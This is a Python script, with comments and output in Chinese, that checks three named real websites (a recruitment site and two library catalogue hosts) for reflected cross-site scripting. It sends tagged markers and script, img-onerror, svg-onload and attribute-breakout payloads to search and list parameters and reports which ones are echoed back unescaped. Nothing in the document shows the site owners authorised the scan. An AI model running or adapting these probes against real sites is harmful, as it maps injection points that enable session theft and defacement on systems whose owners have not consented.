#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XSS 标签注入漏洞 - 全量验证
3个资产 6个路径
"""

import requests
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TAG = "85f7210c60a00209b3858749ec04d4d6"

# 所有测试用例
TESTS = [
    # ===== www.hjrc.cn =====
    {
        "name": "hjrc.cn /search.asp ckey2",
        "url": "http://www.hjrc.cn/search.asp",
        "params": {"page": "2", "txtitle": "testtest", "key": "1",
                   "ckey2": f"1 web_xss_in_tag={TAG} blah=",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "keyword": "web_xss_in_tag"
    },
    {
        "name": "hjrc.cn /search.asp txtitle",
        "url": "http://www.hjrc.cn/search.asp",
        "params": {"page": "1", "txtitle": f"test web_xss_in_tag={TAG} blah=",
                   "key": "1", "ckey2": "1",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "keyword": "web_xss_in_tag"
    },
    {
        "name": "hjrc.cn /content/bio_list.asp id",
        "url": "http://www.hjrc.cn/content/bio_list.asp",
        "params": {"id": f"1 web_xss_in_tag={TAG} blah="},
        "keyword": "web_xss_in_tag"
    },
    {
        "name": "hjrc.cn /rsnews/news_list.asp id",
        "url": "http://www.hjrc.cn/rsnews/news_list.asp",
        "params": {"id": f"1 web_xss_in_tag={TAG} blah="},
        "keyword": "web_xss_in_tag"
    },
    # ===== www.hjlib.cn:8088 =====
    {
        "name": "hjlib.cn /oldNavigationFacet.do keyWord",
        "url": "http://www.hjlib.cn:8088/navigation/oldNavigationFacet.do",
        "params": {"keyWord": f"1 web_xss_in_tag={TAG} blah="},
        "keyword": "web_xss_in_tag"
    },
    {
        "name": "hjlib.cn /oldNavigationFacet.do q",
        "url": "http://www.hjlib.cn:8088/navigation/oldNavigationFacet.do",
        "params": {"q": f"1 web_xss_in_tag={TAG} blah="},
        "keyword": "web_xss_in_tag"
    },
    {
        "name": "hjlib.cn /newNavigationFacet.do keyWord",
        "url": "http://www.hjlib.cn:8088/navigation/newNavigationFacet.do",
        "params": {"keyWord": f"1 web_xss_in_tag={TAG} blah="},
        "keyword": "web_xss_in_tag"
    },
    {
        "name": "hjlib.cn /newNavigationFacet.do q",
        "url": "http://www.hjlib.cn:8088/navigation/newNavigationFacet.do",
        "params": {"q": f"1 web_xss_in_tag={TAG} blah="},
        "keyword": "web_xss_in_tag"
    },
    # ===== thg.hjlib.cn:8088 =====
    {
        "name": "thg.hjlib.cn /oldNavigationFacet.do keyWord",
        "url": "http://thg.hjlib.cn:8088/navigation/oldNavigationFacet.do",
        "params": {"keyWord": f"1 web_xss_in_tag={TAG} blah="},
        "keyword": "web_xss_in_tag"
    },
    {
        "name": "thg.hjlib.cn /oldNavigationFacet.do q",
        "url": "http://thg.hjlib.cn:8088/navigation/oldNavigationFacet.do",
        "params": {"q": f"1 web_xss_in_tag={TAG} blah="},
        "keyword": "web_xss_in_tag"
    },
    {
        "name": "thg.hjlib.cn /newNavigationFacet.do keyWord",
        "url": "http://thg.hjlib.cn:8088/navigation/newNavigationFacet.do",
        "params": {"keyWord": f"1 web_xss_in_tag={TAG} blah="},
        "keyword": "web_xss_in_tag"
    },
    {
        "name": "thg.hjlib.cn /newNavigationFacet.do q",
        "url": "http://thg.hjlib.cn:8088/navigation/newNavigationFacet.do",
        "params": {"q": f"1 web_xss_in_tag={TAG} blah="},
        "keyword": "web_xss_in_tag"
    },
    # ===== 额外: hjrc.cn script/img/svg/onfocus 注入 =====
    {
        "name": "hjrc.cn ckey2 <script>alert",
        "url": "http://www.hjrc.cn/search.asp",
        "params": {"page": "1", "txtitle": "test", "key": "1",
                   "ckey2": "<script>alert(1)</script>",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "keyword": "<script>alert(1)</script>"
    },
    {
        "name": "hjrc.cn ckey2 <img onerror>",
        "url": "http://www.hjrc.cn/search.asp",
        "params": {"page": "1", "txtitle": "test", "key": "1",
                   "ckey2": '<img src=x onerror=alert(1)>',
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "keyword": "<img src=x onerror=alert(1)>"
    },
    {
        "name": "hjrc.cn ckey2 onfocus注入",
        "url": "http://www.hjrc.cn/search.asp",
        "params": {"page": "1", "txtitle": "test", "key": "1",
                   "ckey2": '" onfocus=alert(1) autofocus="',
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "keyword": "onfocus=alert(1)"
    },
    {
        "name": "hjrc.cn ckey2 <svg onload>",
        "url": "http://www.hjrc.cn/search.asp",
        "params": {"page": "1", "txtitle": "test", "key": "1",
                   "ckey2": '<svg onload=alert(1)>',
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "keyword": "<svg onload=alert(1)>"
    },
]

print("=" * 80)
print("  XSS 标签注入漏洞 - 全量验证")
print("  TAG: " + TAG)
print("=" * 80)
print()

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,*/*",
    "Accept-Language": "zh-CN,zh;q=0.9",
})

vuln_list = []
fail_list = []
timeout_list = []

for i, test in enumerate(TESTS):
    print(f"[{i+1:2d}/{len(TESTS)}] {test['name']}")

    try:
        resp = session.get(test["url"], params=test["params"], timeout=15, verify=False)
        body = resp.text
        keyword = test["keyword"]

        if keyword in body:
            idx = body.find(keyword)
            ctx = body[max(0, idx-50):idx+len(keyword)+50]
            print(f"  ✅ 存在漏洞 (Payload原样反射)")
            print(f"     反射上下文: ...{ctx[:120]}...")
            vuln_list.append(test["name"])
        else:
            print(f"  ❌ 未反射 (HTTP {resp.status_code})")
            fail_list.append(test["name"])

    except requests.exceptions.Timeout:
        print(f"  ⏱️  超时")
        timeout_list.append(test["name"])
    except Exception as e:
        print(f"  ❌ 异常: {e}")
        fail_list.append(test["name"])

    print()
    time.sleep(0.3)

print("=" * 80)
print("  验证结果汇总")
print("=" * 80)
print()
print(f"  总测试数: {len(TESTS)}")
print(f"  ✅ 存在漏洞: {len(vuln_list)}")
print(f"  ❌ 未反射: {len(fail_list)}")
print(f"  ⏱️  超时: {len(timeout_list)}")
print()

if vuln_list:
    print("-" * 80)
    print(f"  ✅ 存在漏洞的测试 ({len(vuln_list)}个):")
    print("-" * 80)
    for i, name in enumerate(vuln_list):
        print(f"    {i+1}. {name}")
    print()

if timeout_list:
    print("-" * 80)
    print(f"  ⏱️ 超时的测试 ({len(timeout_list)}个):")
    print("-" * 80)
    for name in timeout_list:
        print(f"    - {name}")

print()
print("=" * 80)
